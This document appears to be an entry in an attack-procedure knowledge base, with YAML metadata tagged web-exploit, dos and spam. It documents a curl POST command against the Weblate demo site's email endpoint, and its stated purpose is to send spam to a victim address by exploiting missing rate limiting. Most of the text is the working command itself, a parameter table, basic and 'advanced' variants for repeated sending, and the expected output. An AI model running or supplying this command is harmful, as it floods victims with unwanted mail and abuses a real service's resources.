---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://demo.weblate.org/accounts/email/' -H 'Referer:
  https://demo.weblate.org/accounts/email/' -H 'X-CSRFToken:
  your_csrf_token_here' -d 'email=victim@example.com&content=' -c cookies.txt
tags:
  - web-exploit
  - dos
  - spam
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.548Z'
verified: false
validated: true
submitted: true
---
# curl-post-email-spam

## Command

```bash
curl -X POST 'https://demo.weblate.org/accounts/email/' \
  -H 'Referer: https://demo.weblate.org/accounts/email/' \
  -H 'X-CSRFToken: your_csrf_token_here' \
  -d 'email=victim@example.com&content=' \
  -c cookies.txt
```

## Description

This command sends a POST request to the Weblate email endpoint to dispatch a spam email to a specified victim address, exploiting the lack of rate limiting. It includes necessary headers for CSRF bypass and saves session cookies for repeated use.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint URL | Yes |
| `-H 'Referer: ...'` | Anti-CSRF referer header | Yes |
| `-H 'X-CSRFToken: ...'` | CSRF token value | Yes |
| `-d 'email=...&content='` | Form data with victim email and empty content | Yes |
| `-c cookies.txt` | Save cookies to file for session persistence | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://demo.weblate.org/accounts/email/' \
  -H 'Referer: https://demo.weblate.org/accounts/email/' \
  -H 'X-CSRFToken: abc123' \
  -d 'email=test@example.com&content='
```

### Advanced Usage

```bash
curl -X POST 'https://demo.weblate.org/accounts/email/' \
  -H 'Referer: https://demo.weblate.org/accounts/email/' \
  -H 'X-CSRFToken: abc123' \
  -d 'email=test@example.com&content=Spam message' \
  -b cookies.txt -c cookies.txt -v
```

## Expected Output

HTTP/1.1 200 OK or 302 Found, with response body indicating successful email send (e.g., redirect to confirmation page). No rate limit errors on repetition.

## Related

- [[Related Procedure|procedures/Send-Unlimited-Emails-via-Unprotected-Endpoint]]
